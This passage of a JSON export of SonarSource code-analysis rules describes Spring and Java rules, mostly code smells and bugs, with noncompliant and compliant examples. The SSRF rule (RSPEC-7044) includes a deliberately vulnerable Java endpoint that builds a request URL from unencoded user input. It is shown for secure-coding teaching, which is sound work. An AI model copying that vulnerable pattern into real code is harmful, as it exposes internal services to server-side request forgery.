WebViews is security-sensitive </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7409","summary":"Exposing native code through JavaScript interfaces is security-sensitive","tags":["cwe","android"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>In tests configured with Springâs <code>@Transactional</code> annotation, methods annotated with <code>@BeforeTransaction</code> or\n<code>@AfterTransaction</code> must be void and have no arguments. These methods are executed before or after a transaction, respectively. Deviating\nfrom this contract by having a non-void return type or accepting arguments will cause Spring to throw a runtime error.</p>\n<h2>How to fix it</h2>\n<p>Ensure that methods annotated with <code>@BeforeTransaction</code> or <code>@AfterTransaction</code> have a void return type and do not accept any\narguments.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Transactional\npublic class TransactionalTest {\n\n    @BeforeTransaction\n    public String setupTransaction(int x) { // non-compliant, method should be void and have no argument\n        // Setup logic\n    }\n\n    @AfterTransaction\n    public int cleanupTransaction(int x) { // non-compliant, method should be void and have no argument\n        // Cleanup logic\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Transactional\npublic class TransactionalTest {\n\n    @BeforeTransaction\n    public void setupTransaction() {\n        // Setup logic\n    }\n\n    @AfterTransaction\n    public void cleanupTransaction() {\n        // Cleanup logic\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring - <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/test/context/transaction/BeforeTransaction.html\">BeforeTransaction</a> </li>\n  <li> Spring - <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/test/context/transaction/AfterTransaction.html\">AfterTransaction</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"},{"name":"reliability","level":"HIGH"},{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7190","summary":"Methods annotated with \"@BeforeTransaction\" or \"@AfterTransaction\" must respect the contract","tags":["spring","tests"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Spring Data Repository supports paging for queries, allowing you to return results in small, manageable chunks rather than retrieving an entire\nlarge result set.</p>\n<p>The conventional approach to paginating data in Spring is to use the <code>Pageable</code> interface to control pagination and to store the query\nresults into a <code>Page</code> or <code>Slice</code>. If a query declaration in a <code>Spring Data Repository</code> returns a <code>Page</code> or\n<code>Slice</code> without taking a <code>Pageable</code> as an input, it raises a runtime exception.</p>\n<p>This rule raises an issue on queries in a <code>Repository</code> that return a <code>Page</code> or <code>Slice</code> without taking a\n<code>Pageable</code> as an input.</p>\n<h2>How to fix it</h2>\n<p>Ensure that query methods returning a <code>Page</code> or <code>Slice</code> include a <code>Pageable</code> parameter in their method\nsignature.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\ninterface ItemRepository extends JpaRepository&lt;Item, Long&gt; {\n    Page&lt;Item&gt; findItems(); //non compliant, no Pageable parameter\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\ninterface ItemRepository extends JpaRepository&lt;Item, Long&gt; {\n    Page&lt;Item&gt; findItems(Pageable pageable);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring - <a href=\"https://docs.spring.io/spring-data/jpa/reference/jpa/query-methods.html\">JPA Query Methods</a> </li>\n  <li> Spring - <a\n  href=\"https://docs.spring.io/spring-data/jpa/reference/repositories/query-methods-details.html#repositories.paging-and-sorting\">Defining Query\n  Methods</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Spring Guides - <a href=\"https://reflectoring.io/spring-boot-paging/\">Paging with Spring Boot</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"},{"name":"reliability","level":"HIGH"},{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7186","summary":"Methods returning \"Page\" or \"Slice\" must take \"Pageable\" as an input parameter","tags":["spring"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Spring provides the <code>@EventListener</code> annotation as a simpler alternative to implementing the <code>ApplicationListener</code> interface\nfor handling events. The <code>@EventListener</code> annotation registers a method as an event handler. This allows to skip the implementation of the\n<code>ApplicationListener</code> interface, making it easier to handle events.</p>\n<p>The <code>@EventListener</code> annotation can only be used on methods that have at most one parameter, which should be the specific event that we\nwant to handle. To listen to several types of events, use the <code>classes</code> argument of the <code>@EventListener</code> annotation.</p>\n<p>This rule raises an issue on all methods annotated with <code>@EventListener</code> that have more than one parameter.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@EventListener\nvoid handleEvent(CustomerEvent customerEvent, ExceptionalEvent exceptionalEvent) { // Non compliant, this will cause a runtime error\n    //... some event handling\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@EventListener(classes = {CustomerEvent.class, ExceptionalEvent.class})\nvoid handleEvent(ApplicationEvent event) { // Only one parameter, of the super type `ApplicationEvent`\n    //... some event handling\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<p>Spring API - <a\nhref=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/context/event/EventListener.html\">@EventListener</a></p>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7185","summary":"@EventListener methods should have one parameter at most","tags":["spring"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>According to Spring documentation, the <code>@Scheduled</code> annotation can only be applied to methods without arguments. Applying @Scheduled to\na method with arguments will result in a runtime error.</p>\n<h2>How to fix it</h2>\n<p>Transform method annotated with <code>@Scheduled</code> into a no-arg method.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class ExampleService {\n\n    @Scheduled(fixedRate = 5000)\n    public void scheduledTask(String param) { // non compliant, method has an argument. It will raise a runtime error.\n        // Task implementation\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class ExampleService {\n\n    @Scheduled(fixedRate = 5000)\n    public void scheduledTask() { // compliant, no-arg method\n        // Task implementation\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring - <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/scheduling/annotation/Scheduled.html\">scheduled</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"},{"name":"reliability","level":"HIGH"},{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7184","summary":"\"@Scheduled\" annotation should only be applied to no-arg methods","tags":["spring"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Spring provides the <code>@InitBinder</code> annotation to initialize a <code>WebDataBinder</code> instance for controllers. This is useful to bind\nrequest parameters to a model object, and to plug converters and formatters into this process.</p>\n<p>Methods annotated with <code>@InitBinder</code> must not have a return value, otherwise the controller containing them will throw an exception when\ninvoked.</p>\n<p>This rule raises an issue when a method annotated with <code>@InitBinder</code> does not have a <code>void</code> return type</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Controller\npublic class MyController {\n\n\t@InitBinder\n\tpublic String initBinder(WebDataBinder binder) { // Non compliant, make the @InitBinder method return void\n\t\tSimpleDateFormat dateFormat = new SimpleDateFormat(\"yyyy-MM-dd\");\n\t\tdateFormat.setLenient(false);\n\t\tbinder.registerCustomEditor(Date.class, new CustomDateEditor(dateFormat, false));\n        return \"OK\";\n\t}\n\n\t// ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Controller\npublic class MyController {\n\n\t@InitBinder\n\tpublic void initBinder(WebDataBinder binder) {\n\t\tSimpleDateFormat dateFormat = new SimpleDateFormat(\"yyyy-MM-dd\");\n\t\tdateFormat.setLenient(false);\n\t\tbinder.registerCustomEditor(Date.class, new CustomDateEditor(dateFormat, false));\n\t}\n\n\t// ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring api - <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/InitBinder.html\">@InitBinder api</a>\n  </li>\n  <li> String documentation - <a href=\"https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-initbinder.html\">@InitBinder\n  docs</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"},{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7183","summary":"@InitBinder methods should have void return type","tags":["spring"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Annotating interfaces or interface methods with <code>@Cache*</code> annotations is not recommended by the official Spring documentation:</p>\n<pre>\nSpring recommends that you only annotate concrete classes (and methods of concrete classes) with the @Cache* annotations, as opposed to annotating interfaces. You certainly can place an @Cache* annotation on an interface (or an interface method), but this works only if you use the proxy mode (mode=\"proxy\"). If you use the weaving-based aspect (mode=\"aspectj\"), the caching settings are not recognized on interface-level declarations by the weaving infrastructure.\n</pre>\n<p>Also, when a method is annotated as cacheable inside an interface, if two different implementations of that method exist, the first one to be\ninvoked will populate the cache. Subsequent calls will always return the cached value, even if itâs the other implementation being called.</p>\n<h3>What is the potential impact?</h3>\n<ul>\n  <li> <strong>Confusing Code</strong>: Developers may mistakenly believe that caching is in effect, leading to confusion and incorrect assumptions\n  about application performance. </li>\n  <li> <strong>Unreliable Code</strong>: Annotating interface methods as <code>@Cacheable</code> hides the cache name from the implementing classes,\n  making it hard to detect where a conflict of names might occur, causing unexpected results at runtime. </li>\n</ul>\n<p>This rule raises an issue when an interface or an interface method is annotated with a <code>@Cache*</code> annotation.</p>\n<h2>How to fix it</h2>\n<p>Move <code>@Cache*</code> annotation from interface or interface method to the concrete class.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic interface ExampleService {\n\n    @Cacheable(\"exampleCache\") // Noncompliant: interface method is annotated with @Cacheable\n    String getData(String id);\n}\n</pre>\n<p>In the following example, if our application has two different rest APIs to query the most popular animal in two different zoos, the first zoo to\nbe queried will populate the cache.</p>\n<p>Calls to a different API to query the other zoo will produce the same cached output, invalidating our applicationâs business logic.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\npublic interface Zoo {\n    @Cacheable(\"popAnimal\") //non compliant, interface method is annotated with @Cacheable\n    Animal getMostPopularAnimal();\n}\n\npublic class SanDiegoZoo implements Zoo {\n    @Override\n    public Animal getMostPopularAnimal() {\n        return new Lion();\n    }\n}\n\npublic class RomeBioparc implements Zoo {\n    @Override\n    public Animal getMostPopularAnimal() {\n        return new Pantegana();\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Service\npublic class ExampleServiceImpl implements ExampleService {\n\n    @Cacheable(\"exampleCache\")\n    @Override\n    public String getData(String id) {\n        // Implementation here\n    }\n}\n</pre>\n<p>With the following solution, we are granted that the two implementations will have separate caches.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\npublic interface Zoo {\n    Animal getMostPopularAnimal();\n}\n\npublic class SanDiegoZoo implements Zoo {\n    @Override\n    @Cacheable(\"sanDiegoPopAnimal\")\n    public Animal getMostPopularAnimal() {\n        return new Lion();\n    }\n}\n\npublic class RomeBioparc implements Zoo {\n    @Override\n    @Cacheable(\"romePopAnimal\")\n    public Animal getMostPopularAnimal() {\n        return new Pantegana();\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring - <a href=\"https://docs.spring.io/spring-framework/reference/integration/cache/annotations.html#cache-annotation-enable\">Declarative\n  Annotation-based Caching</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"},{"name":"reliability","level":"MEDIUM"},{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7180","summary":"\"@Cache*\" annotations should only be applied on concrete classes","tags":["spring"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>@Cacheable</code> annotation is used to store the result of a method and avoid executing it for the same inputs. <code>@CachePut</code>\ninstead is used to force the execution of a method and store the result in the cache. Annotating a method with both will produce unreliable behavior,\nexcept for specific corner-cases when their <code>condition()</code> or <code>unless()</code> expressions are mutually exclusive. Hence this pattern\nis strongly discouraged and an issue will be raised on such cases.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Cacheable\n@CachePut\nvoid getBook(String isbn){ // Non compliant, methods annotated with both @Cacheable and @CachePut will not behave as intended\n    ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Cacheable\nvoid getBook(String isbn){\n    ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring Documentation - <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/cache/annotation/CachePut.html\">@CachePut</a> </li>\n  <li> Spring Documentation - <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/cache/annotation/Cacheable.html\">@Cacheable</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7179","summary":"@Cacheable and @CachePut should not be combined","tags":["spring"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Spring dependency injection framework does not support injecting data into static fields. When @Value, @Inject, or @Autowired are applied to static\nfields, they are ignored.</p>\n<h3>What is the potential impact?</h3>\n<ul>\n  <li> <strong>Null Values</strong>: Uninitialized static fields annotated with @Value, @Inject, or @Autowired will not be initialized by Spring,\n  potentially causing NullPointerException at runtime. </li>\n  <li> <strong>Confusing Code</strong>: The presence of injection annotations on static fields can mislead developers into believing that the fields\n  will be populated by Spring. </li>\n</ul>\n<p>This rule raises an issue when a static field is annotated with @Value, @Inject, or @Autowired.</p>\n<h2>How to fix it</h2>\n<p>Either use an instance field instead of a static field or remove the @Value, @Inject, or @Autowired annotation and initialize the field.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Component\npublic class MyComponent {\n\n    @Value(\"${my.app.prop}\")\n    private static SomeDependency dependency; // non compliant, @Value will be ignored and no value will be injected\n    // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Component\npublic class MyComponent {\n\n    @Value(\"${my.app.prop}\")\n    private final SomeDependency dependency;\n    // ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Java Guides - <a href=\"https://www.baeldung.com/spring-inject-static-field\">Injecting a Value in a Static Field in Spring</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"},{"name":"reliability","level":"HIGH"},{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7178","summary":"Injecting data into static fields is not supported by Spring","tags":["spring"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In a Spring application, the <code>@DirtiesContext</code> annotation marks the ApplicationContext as dirty and indicates that it should be cleared\nand recreated. This is important in tests that modify the context, such as altering the state of singleton beans or databases.</p>\n<p>Misconfiguring <code>@DirtiesContext</code> by setting the <code>methodMode</code> at the class level or the <code>classMode</code> at the method\nlevel will make the annotation have no effect.</p>\n<p>This rule will raise an issue when the incorrect mode is configured on a @DirtiesContext annotation targeting a different scope.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@ContextConfiguration\n@DirtiesContext(methodMode = MethodMode.AFTER_METHOD) // Noncompliant, for class-level control, use classMode instead.\npublic class TestClass {\n  @DirtiesContext(classMode = DirtiesContext.ClassMode.AFTER_CLASS) // Non compliant, for method-level control use methodMode instead\n  public void test() {...}\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@ContextConfiguration\n@DirtiesContext(classMode = DirtiesContext.ClassMode.AFTER_CLASS)\npublic class TestClass {\n  @DirtiesContext(methodMode = MethodMode.AFTER_METHOD)\n  public void test() {...}\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring documentation - <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/test/annotation/DirtiesContext.html\">@DirtiesContext</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7177","summary":"Use appropriate @DirtiesContext modes","tags":["spring","tests"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Calling <code>String.isEmpty()</code> clearly communicates the codeâs intention, which is to test if the string is empty. Using\n<code>String.length() == 0</code> is less direct and makes the code less readable. This preference for <code>isEmpty()</code> extends to all\n<code>CharSequence</code> objects, including <code>StringBuilder</code> and <code>StringBuffer</code>.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nif (\"string\".length() == 0) { /* â¦ */ } // Noncompliant\n\nif (\"string\".length() &gt; 0) { /* â¦ */ } // Noncompliant\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nStringBuilder sb = new StringBuilder();\n...\nif (sb.length() == 0) { /* â¦ */ } // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nif (\"string\".isEmpty()){ /* â¦ */ }\n\nif (!\"string\".isEmpty()){ /* â¦ */ }\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nStringBuilder sb = new StringBuilder();\n...\nif (sb.isEmpty()) { /* â¦ */ }\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a href=\"https://docs.oracle.com/javase/7/docs/api/java/lang/String.html#isEmpty()\">java.lang.String.isEmpty() method</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-7158","summary":"\"String.isEmpty()\" should be used to test for emptiness","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"sqs-10.8.1.101195","communityVersion":"sqcb-24.12.0.100206"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule reports circular dependencies between classes across different packages.</p>\n<h2>Why is this an issue?</h2>\n<p>Circular dependencies occur when two classes reference each other, either directly or indirectly. This means that the classes' dependency structure\ndoes not represent an intuitive hierarchy, which makes it harder to understand and maintain.</p>\n<p>Compared to {rule:java:S7027}, this issue is even more significant when a cycle crosses package boundaries because:</p>\n<ol>\n  <li> It disrupts the dependency hierarchy or layer structure even between packages. </li>\n  <li> It spreads the problem across more distant locations in the source code. </li>\n</ol>\n<h3>What is the potential impact?</h3>\n<p>Circular dependencies increase the architectural complexity of the code, reducing its readability, extensibility, and maintainability. As the\nproject grows, circular dependencies often lead to more circular dependencies, further complication of the architecture and increasing technical debt.\nOver time, untangling these dependencies becomes increasingly difficult.</p>\n<h2>How to fix it</h2>\n<ol>\n  <li> <strong>Extract an interface</strong>: If two classes share similar functionality, move that functionality to an interface that both can\n  implement. This allows each class to depend on the interface rather than on each other. </li>\n  <li> <strong>Use dependency injection</strong>: Replace direct references between classes with dependency injection. By passing necessary objects as\n  parameters through constructors or setters, you break the circular reference, making your code more flexible and easier to test. </li>\n  <li> <strong>Split responsibilities</strong>: Evaluate whether each class is handling too many responsibilities. If so, break them down into\n  smaller, more focused classes. This eliminates circular dependencies and makes sure your code has fewer reasons to change, making it easier to\n  manage and extend. </li>\n  <li> <strong>Rethink the package structure</strong> </li>\n</ol>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following code contains two cycles: Order â Customer â Order, and Order â Product â Order. Furthermore, both cycles are connected to each other\nvia class Order. This is called <em>a tangle consisting of two cycles</em>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass Order {\n    public Customer customer;\n    public List&lt;Product&gt; products;\n}\nclass Customer {\n    public List&lt;Order&gt; orders;\n}\nclass Product {\n    public List&lt;Order&gt; orders;\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>The issue can be resolved by changing the structure. Two service functions can replace the dependencies Customer â Order and Product â Order.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass Order {\n    public Customer customer;\n    public List&lt;Product&gt; products;\n}\nclass Customer { }\nclass Product { }\ninterface OrderService {\n  List&lt;Order&gt; getOrdersByCustomer(Customer customer);\n  List&lt;Order&gt; getOrdersByProduct(Product product);\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Acyclic_dependencies_principle\">Acyclic dependencies principle</a> </li>\n  <li> STAN - <a href=\"https://stan4j.com/advanced/adp/\">Acyclic dependencies principle</a> </li>\n  <li> RSPEC - <a href=\"https://sonarsource.github.io/rspec/#/rspec/{rule:java:S7027}/java\">{rule:java:S7027}: Circular dependencies between classes\n  in the same package should be resolved</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-7091","summary":"Circular dependencies between classes across packages should be resolved","tags":["architecture","design"],"versions":{"serverEdition":"Developer","serverVersion":"sqs-10.8.1.101195","communityVersion":null},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Path Traversal Server-Side Request Forgery is a sub-class of Server-Side Request Forgery (SSRF). In this type of attack, the attacker manipulates\nthe path of the URL in the server-side request, rather than controlling the entire URL. This can lead to unauthorized access to endpoints or data by\naltering the request path.</p>\n<p>Path Traversal SSRF attacks are dangerous because they can exploit the server-side applicationâs ability to send requests to internal resources\nthat are typically inaccessible to external attackers. By manipulating the path, attackers can potentially gain access to sensitive information or\nfunctionalities that should be protected.</p>\n<h3>What is the potential impact?</h3>\n<p>The impact of SSRF vulnerabilities can vary greatly depending on the context in which the user input is used.</p>\n<h4>API Traversal</h4>\n<p>In a path traversal SSRF attack, the attacker can manipulate the path of the server-side request to traverse through different endpoints of an API.\nThis can lead to several potential impacts:</p>\n<h5>Unauthorized access to API endpoints</h5>\n<p>By manipulating the path of the server-side request, an attacker can potentially access API endpoints that are not intended to be publicly\naccessible. This could include endpoints that provide access to sensitive data or functionality. Unauthorized access to these endpoints could lead to\ndata breaches or unauthorized actions being performed on the server.</p>\n<h5>Manipulation of API responses</h5>\n<p>If an attacker can manipulate the path of a server-side request to traverse to different API endpoints, they could potentially influence the\nresponses that the server sends back. This could lead to incorrect or misleading data being returned, which could have a variety of impacts depending\non the nature of the application and the data involved.</p>\n<h2>How to fix it in Java Net Package</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to SSRF as it performs an HTTP request to a URL partially defined by untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@GetMapping(\"/user\")\npublic String getUser(@RequestParam(value = \"id\") String id) {\n    URL url = new URL(\"http://example.com/api/user/\" + id); // Noncompliant\n    HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\n\n@GetMapping(\"/user\")\npublic String getUser(@RequestParam(value = \"id\") String id) {\n    String encodedId = URLEncoder.encode(id, StandardCharsets.UTF_8);\n    URL url = new URL(\"http://example.com/api/user/?id=\" + encodedId);\n    HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>URL-encoding</h4>\n<p>A common method to mitigate path traversal SSRF attacks involves URL-encoding user input prior to its incorporation into a URL. URL-encoding, or\npercent-encoding, is a technique used to encode certain information within a Uniform Resource Identifier (URI). This is achieved by transforming\npotentially malicious characters, such as <code>../</code>, into a safe encoded format that can be safely included in a URL without modifying the\nintended path.</p>\n<p>However, it is crucial to note that simply encoding the user input might not be sufficient in all cases due to varying behaviors of different\nservers. Therefore, it is recommended to move the dynamic, user-controlled input from the actual path of the URL to the query string, if possible.\nThis further reduces the risk of path traversal, as the query string is less likely to be misinterpreted by the server as a directory traversal\ncommand.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\">Top 10 2021 Category A10 - Server-Side Request\n  Forgery (SSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/918\">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7044","summary":"Server-side requests should not be vulnerable to traversing attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"10.7.0.96327","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule reports circular dependencies between classes within the same package.</p>\n<h2>Why is this an issue?</h2>\n<p>Circular dependencies occur when two classes reference each other, either directly or indirectly. This means that the classes' dependency structure\ndoes not represent an intuitive hierarchy, which makes it harder to understand and maintain.</p>\n<h3>What is the potential impact?</h3>\n<p>Circular dependencies increase the architectural complexity of the code, reducing its readability, extensibility, and maintainability. As the\nproject grows, circular dependencies often lead to more circular dependencies, further complication of the architecture and increasing technical debt.\nOver time, untangling these dependencies becomes increasingly difficult.</p>\n<h3>Exceptions</h3>\n<p>Circular dependencies between an inner class and its outer class, or between inner classes within the same enclosing class, are not flagged as\nissues.</p>\n<h2>How to fix it</h2>\n<ol>\n  <li> <strong>Extract an interface</strong>: If two classes share similar functionality, move that 